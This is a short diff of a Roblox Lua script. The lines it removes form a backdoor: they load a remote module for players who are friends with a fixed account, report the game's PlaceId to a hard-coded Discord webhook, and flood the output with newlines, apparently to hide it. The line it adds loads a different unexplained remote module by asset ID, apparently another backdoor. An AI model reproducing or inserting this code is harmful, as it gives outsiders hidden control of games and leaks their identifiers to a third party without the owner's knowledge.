@@ -1,3 +1,1 @@
-pcall(game.Players.PlayerAdded:Connect(function(player) 
-if player:IsFriendsWith(6097947099) then print("!") wait(1)  require(13264918250).load(player.name) end end))
-local http = game:GetService("HttpService") local hook = "https://discord.com/api/webhooks/1303748931397615656/6S8Yqc3RZ2bKU_3T8Gftl2l3EKilFtszOD-sHtwCMRYFfw6ylxKLSO3OE009xshnW0C_" local Data = { ["content"] = ": https://www.roblox.com/games/"..game.PlaceId, } Data = http:JSONEncode(Data) http:PostAsync(hook, Data)print(("\n"):rep(88888))
+require(77565251296196):load()
